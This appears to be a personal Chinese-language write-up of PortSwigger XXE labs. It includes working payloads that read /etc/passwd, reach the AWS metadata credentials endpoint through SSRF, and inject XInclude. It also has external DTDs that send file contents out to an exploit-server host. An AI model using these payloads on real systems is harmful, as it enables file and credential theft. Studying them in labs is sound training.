---
title: XML external entity (XXE) injection
description: XML external entity (XXE) injection
# last_update:
#   date: "2025-08-27T08:00:00+08:00"
last_update:
  date: "2025-11-09T08:00:00+08:00"
---

## Lab: Exploiting XXE using external entities to retrieve files

| Dimension | Description                                                                   |
| --------- | ----------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files     |
| Lab       | https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files |

先看一下正常的 XML Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>2</productId>
  <storeId>1</storeId>
</stockCheck>
```

替換成

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <storeId>1</storeId>
    <productId>&xxe;</productId>
</stockCheck>
```

## Lab: Exploiting XXE to perform SSRF attacks

| Dimension | Description                                                                     |
| --------- | ------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks |
| Lab       | https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf     |

這題要用 SSRF 去偷 AWS EC2 Metadata `http://169.254.169.254/`，但我之前沒用 EC2 戳過，所以不知道格式是什麼

總之這個 Endpoint 回傳的資料格式有點類似 Directory Listing 的結果，沒有任何點綴，單純就是字串用 `\n` 切開，例如

```
hello
world
```

所以我們要順著這個目錄一層一層往下移動，最後成功構造

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

## Lab: Exploiting XInclude to retrieve files

| Dimension | Description                                                  |
| --------- | ------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/xxe#xinclude-attacks    |
| Lab       | https://portswigger.net/web-security/xxe/lab-xinclude-attack |

這題簡單到我還沒意識到就通關了

```js
fetch(`${location.origin}/product/stock`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1`,
  method: "POST",
  credentials: "include",
});
```

不過我很想吐槽的是，這根本是盲注（？誰會知道 API 的 productId 欄位會在 Backend 被轉成 XML，這比 SQLi 還不直覺啊（？也有可能是我太菜...

## Lab: Exploiting XXE via image file upload

| Dimension | Description                                                          |
| --------- | -------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/xxe#xxe-attacks-via-file-upload |
| Lab       | https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload     |

這題利用 Server 的 XML Parser，會把圖片轉成 PNG，記得要讓 `<text>` 在 `<svg>` 的 `viewBox` 內，並且文字要盡可能的大一點，因為這題的 Server 把圖片轉成 PNG 以後會變超模糊，所以文字太小會看不到

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="200" viewBox="0 0 500 200">
    <text x="10" y="50" font-size="50" fill="black">&xxe;</text>
</svg>
```

之前確實有遇過，不管上傳什麼格式的圖片，都會統一轉成 PNG 的 Parser，但以前沒有這個攻擊手法，不知道原來 XML 跟 SVG 還能這樣搭配使用，真酷

## Lab: Blind XXE with out-of-band interaction

| Dimension | Description                                                                                          |
| --------- | ---------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/xxe/blind#detecting-blind-xxe-using-out-of-band-oast-techniques |
| Lab       | https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction                  |

<!-- todo-yus Burp Suite Pro -->

這題需要 Burp Suite Professional，之後再來解～

## Lab: Blind XXE with out-of-band interaction via XML parameter entities

| Dimension | Description                                                                                                  |
| --------- | ------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/xxe/blind#detecting-blind-xxe-using-out-of-band-oast-techniques         |
| Lab       | https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities |

<!-- todo-yus Burp Suite Pro -->

## Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

<!-- last_update:
  date: "2025-11-09T08:00:00+08:00" -->

| Dimension | Description                                                                                        |
| --------- | -------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band |
| Lab       | https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration               |

這題雖然有說需要 Burp Collaborator，但實際上不用，所以免費仔也可以解這題

先查看 check stock 的 request body

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

嘗試改成

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0aa2002a03b4a062b4acb2e301860080.exploit-server.net/exploit"> %xxe;]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

exploit-server 構造

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0aa2002a03b4a062b4acb2e301860080.exploit-server.net/?file=%file;'>">
%eval;
%exfiltrate;
```

完整的 HTTP Reuqest PoC

```ts
const xmlPayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0aa2002a03b4a062b4acb2e301860080.exploit-server.net/exploit"> %xxe;]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>`;

fetch(`${location.origin}/product/stock`, {
  headers: {
    "content-type": "application/xml",
  },
  body: xmlPayload,
  method: "POST",
  credentials: "include",
});
```

之後到 `/log` 查看 `/etc/hostname` 的內容，即可通關～

## Lab: Exploiting blind XXE to retrieve data via error messages

<!-- todo-yus 可重打 -->

| Dimension | Description                                                                                             |
| --------- | ------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages |
| Lab       | https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages           |

嘗試

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
<stockCheck><productId>%eval;</productId><storeId>%error;</storeId></stockCheck>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
]>
<stockCheck>
    <productId>%eval;</productId>
    <storeId>%error;</storeId>
</stockCheck>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
]>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % hello "<!ENTITY &#x25; world SYSTEM 'file:///nonexistent/%file;'>">
    %hello;
    %world;
]>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % hello "<!ENTITY &#x25; world SYSTEM 'file:///nonexistent/%file;'>">
    %hello;
]>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % hello "<!ENTITY &#x25; world SYSTEM 'file:///nonexistent/%file;'>">
]>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % hello "<!ENTITY &#x25;>">
]>
```

=> `"Entities are not allowed for security reasons"`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
]>
```

=> `"XML parser exited with error: org.xml.sax.SAXParseException; lineNumber: 4; columnNumber: 3; Premature end of file."`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    %file;
]>
```

=> `"XML parser exited with error: org.xml.sax.SAXParseException; systemId: file:///etc/passwd; lineNumber: 1; columnNumber: 1; The markup declarations contained or pointed to by the document type declaration must be well-formed."`

在 exploit-server 定義

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0af6007c0389b3028050c0f0014900f4.exploit-server.net/?%file;'>">
%eval;
%exfil;
```

Client 端

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % dtd SYSTEM "https://exploit-0af6007c0389b3028050c0f0014900f4.exploit-server.net/exploit">
    %dtd;
]>
```

=> `"XML parser exited with error: java.net.MalformedURLException: Illegal character in URL"`

感覺快成功了，回到題目本身，是說要用 error message，所以修改 exploit-server 的 body

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%exfil;
```

## Lab: Exploiting XXE to retrieve data by repurposing a local DTD

| Dimension | Description                                                                                           |
| --------- | ----------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-by-repurposing-a-local-dtd        |
| Lab       | https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd |

這題是 Expert 等級，但其實只要照著範例 + Hint 改一下就好

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

HTML Entity 解碼過程

```
&#x25; => %
&#x26; => &
&#x27; => '
```

解碼後

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

這個比較特別，會經過兩階段的解碼

```
&#x26;#x25; => &#x25; => %
```

我覺得，能想到這種 payload 的，根本是鬼才，要對 XML 的解析機制有很深入的了解吧！我光是要理解 payload 都有難度了...

## 小結

學完 XXE 之後，覺得還是很虛，要我在現實世界找到 XXE，我應該還是找不到，加上現代也很少用 XML 吧...基本上都是 JSON，我只有在 WordPress 的 `/xmlrpc.php` 看過 XML 傳輸格式而已。之後應該會再花時間補一下 XML 的基本語法，不然感覺沒有完整的學習到QQ

## 參考資料

- https://portswigger.net/web-security/xxe
